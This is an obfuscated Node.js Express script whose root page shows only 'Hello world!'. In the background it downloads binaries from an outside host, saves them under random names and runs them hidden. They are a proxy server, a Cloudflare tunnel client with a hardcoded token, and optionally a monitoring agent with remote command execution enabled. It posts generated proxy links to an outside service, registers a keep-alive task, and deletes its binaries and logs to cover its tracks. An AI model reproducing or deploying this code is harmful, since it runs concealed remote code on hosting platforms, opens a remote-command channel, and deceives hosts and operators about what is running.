const _0x112639=_0x35c1;(function(_0x37b35e,_0x362eed){const _0x246f59=_0x35c1,_0x31d070=_0x37b35e();while(!![]){try{const _0x362941=parseInt(_0x246f59(0xaa))/0x1*(-parseInt(_0x246f59(0x99))/0x2)+-parseInt(_0x246f59(0xd4))/0x3+parseInt(_0x246f59(0x110))/0x4*(parseInt(_0x246f59(0x11c))/0x5)+parseInt(_0x246f59(0x8e))/0x6+-parseInt(_0x246f59(0xbc))/0x7+parseInt(_0x246f59(0xd5))/0x8*(parseInt(_0x246f59(0x97))/0x9)+parseInt(_0x246f59(0xac))/0xa;if(_0x362941===_0x362eed)break;else _0x31d070['push'](_0x31d070['shift']());}catch(_0x286798){_0x31d070['push'](_0x31d070['shift']());}}}(_0x4924,0xc0796));const express=require(_0x112639(0x73)),app=express(),axios=require(_0x112639(0xcc)),os=require('os'),fs=require('fs'),path=require(_0x112639(0xe0)),{promisify}=require(_0x112639(0xf2)),exec=promisify(require('child_process')[_0x112639(0xa1)]),{execSync}=require(_0x112639(0x11a)),UPLOAD_URL=process['env'][_0x112639(0xcb)]||'',PROJECT_URL=process[_0x112639(0xf7)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x112639(0xf7)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x112639(0xf7)][_0x112639(0xe9)]||_0x112639(0x6d),SUB_PATH=process[_0x112639(0xf7)][_0x112639(0xdf)]||_0x112639(0xe5),PORT=process[_0x112639(0xf7)][_0x112639(0xf5)]||process[_0x112639(0xf7)][_0x112639(0x94)]||0xbb8,UUID=process['env'][_0x112639(0xe3)]||_0x112639(0xbb),NEZHA_SERVER=process[_0x112639(0xf7)][_0x112639(0x104)]||'',NEZHA_PORT=process[_0x112639(0xf7)][_0x112639(0x6f)]||'',NEZHA_KEY=process['env'][_0x112639(0xbd)]||'',ARGO_DOMAIN=process[_0x112639(0xf7)][_0x112639(0xd3)]||_0x112639(0xb9),ARGO_AUTH=process[_0x112639(0xf7)]['ARGO_AUTH']||_0x112639(0xfa),ARGO_PORT=process[_0x112639(0xf7)][_0x112639(0xc8)]||0x1f41,CFIP=process['env'][_0x112639(0xf0)]||'cdns.doon.eu.org',CFPORT=process[_0x112639(0xf7)][_0x112639(0xca)]||0x1bb,NAME=process[_0x112639(0xf7)][_0x112639(0xff)]||'cftl';!fs[_0x112639(0x106)](FILE_PATH)?(fs[_0x112639(0xd6)](FILE_PATH),console[_0x112639(0x105)](FILE_PATH+_0x112639(0xb6))):console[_0x112639(0x105)](FILE_PATH+_0x112639(0xee));function generateRandomName(){const _0x1ec7c0=_0x112639,_0xe6d2a7=_0x1ec7c0(0x9a);let _0x1264a1='';for(let _0x2e6737=0x0;_0x2e6737<0x6;_0x2e6737++){_0x1264a1+=_0xe6d2a7[_0x1ec7c0(0x77)](Math['floor'](Math[_0x1ec7c0(0x11d)]()*_0xe6d2a7[_0x1ec7c0(0xd7)]));}return _0x1264a1;}function _0x4924(){const _0xac7399=['vless','util','statSync','split','SERVER_PORT','blackhole','env','/vmess-argo','match','eyJhIjoiMTk4YTk0ZTg5ODNkZjVjOTI2NTFiYmFiOTRlYzVhM2EiLCJ0IjoiYjU3OWYyOGEtNTFkMC00NTUwLWFkZTAtY2M2OGE3NDg2ZDQ1IiwicyI6Ill6RXpOVGszTWpRdFlqbGhNUzAwWkdZeExUZ3dZMlF0WVdNNU5qUmlPVE0yTkdNMSJ9','rm\x20-rf\x20','&fp=firefox&type=ws&host=','https://arm64.ssss.nyc.mn/bot','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','NAME','unlink','map','arm','pipe','NEZHA_SERVER','log','existsSync','tls','boot.log','\x0a\x20\x20tunnel:\x20','Error\x20executing\x20command:\x20','/tunnel.yml\x20run','tcp','from','clear','unlinkSync','232fWjGny','tunnel.yml','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','test','\x0a\x20\x20credentials-file:\x20','true','false','sub.txt','Skipping\x20adding\x20automatic\x20access\x20task','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','child_process','win32','16850vYGpNg','random','writeFileSync','status','Download\x20','\x20successfully','none','ArgoDomain:','127.0.0.1','set','\x20-p\x20','./tmp','App\x20is\x20running','NEZHA_PORT','stream','\x0a\x20\x20\x0atrojan://','includes','express','unshift','utf-8','https://arm64.ssss.nyc.mn/web','charAt','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/vmess-argo?ed=2560','send','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','2053','fileName','\x0a\x20\x20\x20\x20','message','arch','/api/delete-nodes','forEach','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://amd64.ssss.nyc.mn/agent','get','direct','?security=tls&sni=','https://amd64.ssss.nyc.mn/web','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','response','Error\x20reading\x20boot.log:','automatic\x20access\x20task\x20added\x20successfully','6520308tgFtAC','tunnel.json','http','substring','text/plain;\x20charset=utf-8','\x20-c\x20','PORT','/api/add-nodes','https://amd64.ssss.nyc.mn/bot','18GkpOug','firefox','966682PSXLck','abcdefghijklmnopqrstuvwxyz','--tls','createWriteStream','list.txt','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','toString','exec','web\x20running\x20error:\x20','application/json','xtls-rprx-vision','.exe\x20>\x20nul\x202>&1','join','data','Empowerment\x20failed\x20for\x20','vmess','3AuPPLR','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','20394950GTTLOP','arm64','&path=%2Fvless-argo%3Fed%3D2560#','config.json','https+local://8.8.8.8/dns-query','base64','\x20is\x20running','pkill\x20-f\x20\x22[','https://oooo.serv00.net/add-url','taskkill\x20/f\x20/im\x20','\x20is\x20created','/vless-argo','2083','tl.konstants.xyz','php\x20running\x20error:\x20','bdf0919f-d433-48e3-9c0a-ad1265e3a392','9516598VhWELy','NEZHA_KEY','2096','443','/trojan-argo','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','8443','/dev/null','push','\x20>\x20nul\x202>&1','ARGO_PORT','platform','CFPORT','UPLOAD_URL','axios','https://arm64.ssss.nyc.mn/agent','/config.json\x20>/dev/null\x202>&1\x20&','\x0aclient_secret:\x20','?encryption=none&security=tls&sni=','/api/add-subscriptions','error','ARGO_DOMAIN','116634RqFzHe','1260464JcQAOW','mkdirSync','length','trojan','stringify','catch','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','freedom','filter','SUB_PATH','path','Nodes\x20uploaded\x20successfully','\x20failed:\x20','UUID','block','sub','basename','isFile','post','FILE_PATH','finish','/sub.txt\x20saved\x20successfully','readFileSync','nohup\x20','\x20already\x20exists','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','CFIP'];_0x4924=function(){return _0xac7399;};return _0x4924();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x112639(0xa6)](FILE_PATH,npmName),phpPath=path[_0x112639(0xa6)](FILE_PATH,phpName),webPath=path[_0x112639(0xa6)](FILE_PATH,webName),botPath=path[_0x112639(0xa6)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x112639(0x117)),listPath=path[_0x112639(0xa6)](FILE_PATH,_0x112639(0x9d)),bootLogPath=path[_0x112639(0xa6)](FILE_PATH,'boot.log'),configPath=path[_0x112639(0xa6)](FILE_PATH,_0x112639(0xaf));function deleteNodes(){const _0x1dbd29=_0x112639;try{if(!UPLOAD_URL)return;if(!fs[_0x1dbd29(0x106)](subPath))return;let _0x362195;try{_0x362195=fs[_0x1dbd29(0xec)](subPath,'utf-8');}catch{return null;}const _0x1f58d9=Buffer[_0x1dbd29(0x10d)](_0x362195,_0x1dbd29(0xb1))[_0x1dbd29(0xa0)](_0x1dbd29(0x75)),_0xdcc8a6=_0x1f58d9[_0x1dbd29(0xf4)]('\x0a')['filter'](_0x2b527d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1dbd29(0x113)](_0x2b527d));if(_0xdcc8a6[_0x1dbd29(0xd7)]===0x0)return;return axios['post'](UPLOAD_URL+_0x1dbd29(0x82),JSON[_0x1dbd29(0xd9)]({'nodes':_0xdcc8a6}),{'headers':{'Content-Type':_0x1dbd29(0xa3)}})[_0x1dbd29(0xda)](_0x39269e=>{return null;}),null;}catch(_0x366cd9){return null;}}function cleanupOldFiles(){const _0x235c2b=_0x112639;try{const _0x3db1ab=fs['readdirSync'](FILE_PATH);_0x3db1ab[_0x235c2b(0x83)](_0x8be9e1=>{const _0x521ae3=_0x235c2b,_0x39b1f8=path[_0x521ae3(0xa6)](FILE_PATH,_0x8be9e1);try{const _0x395934=fs[_0x521ae3(0xf3)](_0x39b1f8);_0x395934[_0x521ae3(0xe7)]()&&fs[_0x521ae3(0x10f)](_0x39b1f8);}catch(_0x43163b){}});}catch(_0x1e2a03){}}app[_0x112639(0x86)]('/',function(_0x40e2bf,_0x29920a){const _0x27feb5=_0x112639;_0x29920a[_0x27feb5(0x7b)]('Hello\x20world!');});async function generateConfig(){const _0x3b03b0=_0x112639,_0x16ca0c={'log':{'access':'/dev/null','error':_0x3b03b0(0xc5),'loglevel':_0x3b03b0(0x68)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3b03b0(0xf1),'settings':{'clients':[{'id':UUID,'flow':_0x3b03b0(0xa4)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x3b03b0(0xb7),'dest':0xbba},{'path':_0x3b03b0(0xf8),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x3b03b0(0x10c)}},{'port':0xbb9,'listen':_0x3b03b0(0x6a),'protocol':_0x3b03b0(0xf1),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x3b03b0(0x10c),'security':_0x3b03b0(0x68)}},{'port':0xbba,'listen':_0x3b03b0(0x6a),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3b03b0(0x68)},'streamSettings':{'network':'ws','security':_0x3b03b0(0x68),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3b03b0(0x90),_0x3b03b0(0x107),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x3b03b0(0xa9),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3b03b0(0xf8)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b03b0(0x90),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3b03b0(0x6a),'protocol':_0x3b03b0(0xd8),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3b03b0(0x68),'wsSettings':{'path':_0x3b03b0(0xc0)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b03b0(0x90),_0x3b03b0(0x107),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x3b03b0(0xb0)]},'outbounds':[{'protocol':_0x3b03b0(0xdd),'tag':_0x3b03b0(0x87)},{'protocol':_0x3b03b0(0xf6),'tag':_0x3b03b0(0xe4)}]};fs['writeFileSync'](path[_0x3b03b0(0xa6)](FILE_PATH,_0x3b03b0(0xaf)),JSON[_0x3b03b0(0xd9)](_0x16ca0c,null,0x2));}function getSystemArchitecture(){const _0x18eb7c=_0x112639,_0x16af77=os[_0x18eb7c(0x81)]();return _0x16af77===_0x18eb7c(0x102)||_0x16af77===_0x18eb7c(0xad)||_0x16af77==='aarch64'?'arm':'amd';}function downloadFile(_0x22e63f,_0x49c02a,_0x564bf0){const _0x57e236=_0x112639,_0x230fc4=_0x22e63f;!fs[_0x57e236(0x106)](FILE_PATH)&&fs[_0x57e236(0xd6)](FILE_PATH,{'recursive':!![]});const _0x596906=fs[_0x57e236(0x9c)](_0x230fc4);axios({'method':'get','url':_0x49c02a,'responseType':_0x57e236(0x70)})['then'](_0x29892e=>{const _0x20e291=_0x57e236;_0x29892e[_0x20e291(0xa7)][_0x20e291(0x103)](_0x596906),_0x596906['on'](_0x20e291(0xea),()=>{const _0x49bdbc=_0x20e291;_0x596906['close'](),console[_0x49bdbc(0x105)]('Download\x20'+path[_0x49bdbc(0xe6)](_0x230fc4)+_0x49bdbc(0x67)),_0x564bf0(null,_0x230fc4);}),_0x596906['on'](_0x20e291(0xd2),_0x461ab1=>{const _0x1822bc=_0x20e291;fs[_0x1822bc(0x100)](_0x230fc4,()=>{});const _0x4a4f07='Download\x20'+path[_0x1822bc(0xe6)](_0x230fc4)+_0x1822bc(0xe2)+_0x461ab1[_0x1822bc(0x80)];console[_0x1822bc(0xd2)](_0x4a4f07),_0x564bf0(_0x4a4f07);});})[_0x57e236(0xda)](_0xf5493b=>{const _0x14a8b7=_0x57e236,_0x1128ff=_0x14a8b7(0x66)+path[_0x14a8b7(0xe6)](_0x230fc4)+_0x14a8b7(0xe2)+_0xf5493b[_0x14a8b7(0x80)];console[_0x14a8b7(0xd2)](_0x1128ff),_0x564bf0(_0x1128ff);});}async function downloadFilesAndRun(){const _0x1fb791=_0x112639,_0x23e322=getSystemArchitecture(),_0x61a0cc=getFilesForArchitecture(_0x23e322);if(_0x61a0cc[_0x1fb791(0xd7)]===0x0){console[_0x1fb791(0x105)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x2eda48=_0x61a0cc[_0x1fb791(0x101)](_0x264c3f=>{return new Promise((_0x5189e,_0x17ec9d)=>{const _0x2e3a55=_0x35c1;downloadFile(_0x264c3f[_0x2e3a55(0x7e)],_0x264c3f['fileUrl'],(_0x33e67a,_0x4863a1)=>{_0x33e67a?_0x17ec9d(_0x33e67a):_0x5189e(_0x4863a1);});});});try{await Promise['all'](_0x2eda48);}catch(_0x4e00d5){console[_0x1fb791(0xd2)]('Error\x20downloading\x20files:',_0x4e00d5);return;}function _0x176e0e(_0x132006){const _0x27cd7b=0x1fd;_0x132006['forEach'](_0x20abfa=>{const _0x5aa195=_0x35c1;fs[_0x5aa195(0x106)](_0x20abfa)&&fs['chmod'](_0x20abfa,_0x27cd7b,_0x478835=>{const _0x95231e=_0x5aa195;_0x478835?console[_0x95231e(0xd2)](_0x95231e(0xa8)+_0x20abfa+':\x20'+_0x478835):console[_0x95231e(0x105)]('Empowerment\x20success\x20for\x20'+_0x20abfa+':\x20'+_0x27cd7b[_0x95231e(0xa0)](0x8));});});}const _0x567e41=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x176e0e(_0x567e41);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4a2f03=NEZHA_SERVER[_0x1fb791(0x72)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x5ce046=new Set([_0x1fb791(0xbf),_0x1fb791(0xc4),_0x1fb791(0xbe),'2087','2083','2053']),_0x253c8f=_0x5ce046['has'](_0x4a2f03)?_0x1fb791(0x115):_0x1fb791(0x116),_0x872d40=_0x1fb791(0xcf)+NEZHA_KEY+_0x1fb791(0x79)+NEZHA_SERVER+_0x1fb791(0x84)+_0x253c8f+_0x1fb791(0xef)+UUID;fs[_0x1fb791(0x64)](path['join'](FILE_PATH,'config.yaml'),_0x872d40);const _0x2918fb='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x1fb791(0x112);try{await exec(_0x2918fb),console[_0x1fb791(0x105)](phpName+_0x1fb791(0xb2)),await new Promise(_0x1de550=>setTimeout(_0x1de550,0x3e8));}catch(_0x128386){console[_0x1fb791(0xd2)](_0x1fb791(0xba)+_0x128386);}}else{let _0x22e089='';const _0x5358cf=[_0x1fb791(0xbf),_0x1fb791(0xc4),'2096','2087',_0x1fb791(0xb8),_0x1fb791(0x7d)];_0x5358cf[_0x1fb791(0x72)](NEZHA_PORT)&&(_0x22e089=_0x1fb791(0x9b));const _0x580753=_0x1fb791(0xed)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x1fb791(0x6c)+NEZHA_KEY+'\x20'+_0x22e089+_0x1fb791(0x78);try{await exec(_0x580753),console[_0x1fb791(0x105)](npmName+_0x1fb791(0xb2)),await new Promise(_0x4a4d4b=>setTimeout(_0x4a4d4b,0x3e8));}catch(_0x3e9b39){console['error']('npm\x20running\x20error:\x20'+_0x3e9b39);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x10fabc=_0x1fb791(0xed)+webPath+_0x1fb791(0x93)+FILE_PATH+_0x1fb791(0xce);try{await exec(_0x10fabc),console[_0x1fb791(0x105)](webName+_0x1fb791(0xb2)),await new Promise(_0x51a8a3=>setTimeout(_0x51a8a3,0x3e8));}catch(_0x691c0a){console['error'](_0x1fb791(0xa2)+_0x691c0a);}if(fs['existsSync'](botPath)){let _0x8e07a9;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x8e07a9=_0x1fb791(0xc3)+ARGO_AUTH;else ARGO_AUTH[_0x1fb791(0xf9)](/TunnelSecret/)?_0x8e07a9='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x1fb791(0x10b):_0x8e07a9=_0x1fb791(0x9e)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x8e07a9+'\x20>/dev/null\x202>&1\x20&'),console[_0x1fb791(0x105)](botName+_0x1fb791(0xb2)),await new Promise(_0x4314fc=>setTimeout(_0x4314fc,0x7d0));}catch(_0x1b3866){console[_0x1fb791(0xd2)](_0x1fb791(0x10a)+_0x1b3866);}}await new Promise(_0x304ea9=>setTimeout(_0x304ea9,0x1388));}function getFilesForArchitecture(_0x247496){const _0x8a87cc=_0x112639;let _0x311bdb;_0x247496===_0x8a87cc(0x102)?_0x311bdb=[{'fileName':webPath,'fileUrl':_0x8a87cc(0x76)},{'fileName':botPath,'fileUrl':_0x8a87cc(0xfd)}]:_0x311bdb=[{'fileName':webPath,'fileUrl':_0x8a87cc(0x89)},{'fileName':botPath,'fileUrl':_0x8a87cc(0x96)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x555cbf=_0x247496===_0x8a87cc(0x102)?_0x8a87cc(0xcd):_0x8a87cc(0x85);_0x311bdb[_0x8a87cc(0x74)]({'fileName':npmPath,'fileUrl':_0x555cbf});}else{const _0x3ffe5f=_0x247496===_0x8a87cc(0x102)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x311bdb[_0x8a87cc(0x74)]({'fileName':phpPath,'fileUrl':_0x3ffe5f});}}return _0x311bdb;}function argoType(){const _0x2aa41d=_0x112639;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2aa41d(0x105)](_0x2aa41d(0xc1));return;}if(ARGO_AUTH[_0x2aa41d(0x72)]('TunnelSecret')){fs[_0x2aa41d(0x64)](path[_0x2aa41d(0xa6)](FILE_PATH,_0x2aa41d(0x8f)),ARGO_AUTH);const _0x3258fb=_0x2aa41d(0x109)+ARGO_AUTH[_0x2aa41d(0xf4)]('\x22')[0xb]+_0x2aa41d(0x114)+path[_0x2aa41d(0xa6)](FILE_PATH,_0x2aa41d(0x8f))+_0x2aa41d(0xdc)+ARGO_DOMAIN+_0x2aa41d(0xab)+ARGO_PORT+_0x2aa41d(0x7c);fs[_0x2aa41d(0x64)](path[_0x2aa41d(0xa6)](FILE_PATH,_0x2aa41d(0x111)),_0x3258fb);}else console[_0x2aa41d(0x105)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x370d1a=_0x112639;let _0x557ba5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x557ba5=ARGO_DOMAIN,console[_0x370d1a(0x105)]('ARGO_DOMAIN:',_0x557ba5),await _0x2a8f6d(_0x557ba5);else try{const _0x4efadc=fs[_0x370d1a(0xec)](path[_0x370d1a(0xa6)](FILE_PATH,_0x370d1a(0x108)),_0x370d1a(0x75)),_0x4056c7=_0x4efadc[_0x370d1a(0xf4)]('\x0a'),_0x5c1b11=[];_0x4056c7[_0x370d1a(0x83)](_0x51049d=>{const _0xd1626b=_0x370d1a,_0x397796=_0x51049d[_0xd1626b(0xf9)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x397796){const _0x224e16=_0x397796[0x1];_0x5c1b11[_0xd1626b(0xc6)](_0x224e16);}});if(_0x5c1b11[_0x370d1a(0xd7)]>0x0)_0x557ba5=_0x5c1b11[0x0],console[_0x370d1a(0x105)](_0x370d1a(0x69),_0x557ba5),await _0x2a8f6d(_0x557ba5);else{console['log'](_0x370d1a(0xfe)),fs[_0x370d1a(0x10f)](path['join'](FILE_PATH,_0x370d1a(0x108)));async function _0x34a3c8(){const _0x1e9726=_0x370d1a;try{process[_0x1e9726(0xc9)]==='win32'?await exec(_0x1e9726(0xb5)+botName+_0x1e9726(0xa5)):await exec(_0x1e9726(0xb3)+botName[_0x1e9726(0x77)](0x0)+']'+botName[_0x1e9726(0x91)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2a5a82){}}_0x34a3c8(),await new Promise(_0x326f1a=>setTimeout(_0x326f1a,0xbb8));const _0x3dc6e4=_0x370d1a(0x9e)+FILE_PATH+_0x370d1a(0x9f)+ARGO_PORT;try{await exec(_0x370d1a(0xed)+botPath+'\x20'+_0x3dc6e4+_0x370d1a(0xc2)),console[_0x370d1a(0x105)](botName+_0x370d1a(0xb2)),await new Promise(_0x397087=>setTimeout(_0x397087,0xbb8)),await extractDomains();}catch(_0x592898){console['error'](_0x370d1a(0x10a)+_0x592898);}}}catch(_0x349b80){console[_0x370d1a(0xd2)](_0x370d1a(0x8c),_0x349b80);}async function _0x2a8f6d(_0x3710d9){const _0x128b0c=_0x370d1a,_0x508765=execSync(_0x128b0c(0x8a),{'encoding':_0x128b0c(0x75)}),_0x866002=_0x508765['trim'](),_0x37c07a=NAME?NAME+'-'+_0x866002:_0x866002;return new Promise(_0x770511=>{setTimeout(()=>{const _0x3d020d=_0x35c1,_0x29cd85={'v':'2','ps':''+_0x37c07a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3d020d(0x68),'net':'ws','type':_0x3d020d(0x68),'host':_0x3710d9,'path':_0x3d020d(0x7a),'tls':_0x3d020d(0x107),'sni':_0x3710d9,'alpn':'','fp':_0x3d020d(0x98)},_0x3668a5='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x3d020d(0xd0)+_0x3710d9+_0x3d020d(0xfc)+_0x3710d9+_0x3d020d(0xae)+_0x37c07a+'\x0a\x20\x20\x0avmess://'+Buffer[_0x3d020d(0x10d)](JSON[_0x3d020d(0xd9)](_0x29cd85))[_0x3d020d(0xa0)](_0x3d020d(0xb1))+_0x3d020d(0x71)+UUID+'@'+CFIP+':'+CFPORT+_0x3d020d(0x88)+_0x3710d9+_0x3d020d(0xfc)+_0x3710d9+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x37c07a+_0x3d020d(0x7f);console[_0x3d020d(0x105)](Buffer[_0x3d020d(0x10d)](_0x3668a5)[_0x3d020d(0xa0)](_0x3d020d(0xb1))),fs[_0x3d020d(0x64)](subPath,Buffer['from'](_0x3668a5)[_0x3d020d(0xa0)](_0x3d020d(0xb1))),console['log'](FILE_PATH+_0x3d020d(0xeb)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x3af178,_0x2cba2d)=>{const _0x41385d=_0x3d020d,_0x595516=Buffer['from'](_0x3668a5)['toString'](_0x41385d(0xb1));_0x2cba2d[_0x41385d(0x6b)]('Content-Type',_0x41385d(0x92)),_0x2cba2d['send'](_0x595516);}),_0x770511(_0x3668a5);},0x7d0);});}}async function uploadNodes(){const _0x28b240=_0x112639;if(UPLOAD_URL&&PROJECT_URL){const _0x46c100=PROJECT_URL+'/'+SUB_PATH,_0x247cf4={'subscription':[_0x46c100]};try{const _0x35befe=await axios['post'](UPLOAD_URL+_0x28b240(0xd1),_0x247cf4,{'headers':{'Content-Type':'application/json'}});return _0x35befe&&_0x35befe['status']===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x35befe):null;}catch(_0x4419f8){if(_0x4419f8[_0x28b240(0x8b)]){if(_0x4419f8[_0x28b240(0x8b)][_0x28b240(0x65)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x28b240(0x106)](listPath))return;const _0xc78559=fs[_0x28b240(0xec)](listPath,_0x28b240(0x75)),_0x12ce4f=_0xc78559[_0x28b240(0xf4)]('\x0a')[_0x28b240(0xde)](_0x411b67=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x28b240(0x113)](_0x411b67));if(_0x12ce4f[_0x28b240(0xd7)]===0x0)return;const _0x1066b8=JSON[_0x28b240(0xd9)]({'nodes':_0x12ce4f});try{const _0x1d9f91=await axios[_0x28b240(0xe8)](UPLOAD_URL+_0x28b240(0x95),_0x1066b8,{'headers':{'Content-Type':_0x28b240(0xa3)}});return _0x1d9f91&&_0x1d9f91[_0x28b240(0x65)]===0xc8?(console['log'](_0x28b240(0xe1)),_0x1d9f91):null;}catch(_0x1b05e5){return null;}}else return;}}function _0x35c1(_0x50eb73,_0xce4194){const _0x49247c=_0x4924();return _0x35c1=function(_0x35c146,_0x272d64){_0x35c146=_0x35c146-0x64;let _0x45ea0f=_0x49247c[_0x35c146];return _0x45ea0f;},_0x35c1(_0x50eb73,_0xce4194);}function cleanFiles(){setTimeout(()=>{const _0x53a3c9=_0x35c1,_0x6b7d25=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x6b7d25[_0x53a3c9(0xc6)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x6b7d25['push'](phpPath);process[_0x53a3c9(0xc9)]===_0x53a3c9(0x11b)?exec('del\x20/f\x20/q\x20'+_0x6b7d25[_0x53a3c9(0xa6)]('\x20')+_0x53a3c9(0xc7),_0xcacd1c=>{const _0x1a4408=_0x53a3c9;console['clear'](),console[_0x1a4408(0x105)](_0x1a4408(0x6e)),console[_0x1a4408(0x105)](_0x1a4408(0x119));}):exec(_0x53a3c9(0xfb)+_0x6b7d25['join']('\x20')+'\x20>/dev/null\x202>&1',_0x2ae126=>{const _0x51af9b=_0x53a3c9;console[_0x51af9b(0x10e)](),console[_0x51af9b(0x105)]('App\x20is\x20running'),console[_0x51af9b(0x105)](_0x51af9b(0x119));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x34e478=_0x112639;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x34e478(0x105)](_0x34e478(0x118));return;}try{const _0xa6b39b=await axios[_0x34e478(0xe8)](_0x34e478(0xb4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x34e478(0xa3)}});return console['log'](_0x34e478(0x8d)),_0xa6b39b;}catch(_0x390899){return console[_0x34e478(0xd2)](_0x34e478(0xdb)+_0x390899[_0x34e478(0x80)]),null;}}async function startserver(){const _0x84207e=_0x112639;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3d347b){console[_0x84207e(0xd2)]('Error\x20in\x20startserver:',_0x3d347b);}}startserver()[_0x112639(0xda)](_0xa96108=>{const _0x17b3bf=_0x112639;console[_0x17b3bf(0xd2)]('Unhandled\x20error\x20in\x20startserver:',_0xa96108);}),app['listen'](PORT,()=>console[_0x112639(0x105)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
